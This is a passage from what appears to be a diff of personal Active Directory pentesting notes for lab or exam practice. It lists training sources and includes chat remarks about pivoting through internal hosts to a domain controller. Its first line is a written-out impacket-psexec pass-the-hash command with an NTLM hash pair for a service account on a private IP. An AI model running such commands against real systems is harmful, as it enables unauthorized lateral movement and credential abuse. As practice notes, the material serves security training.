 impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zensvc@192.168.183.170
-````
-### Sources to try
-````
-https://tryhackme.com/room/attacktivedirectory
-HTB AD
-powerup (win enum)
-````
-````
-mine was Kali workstation -> public Box 1  client -> Internal Box 2 client -> DC
-[8:36 PM]
-it just depends, my last AD i didnt have to pivot because all IP's were public facing, but this time 2 were internal
 ````
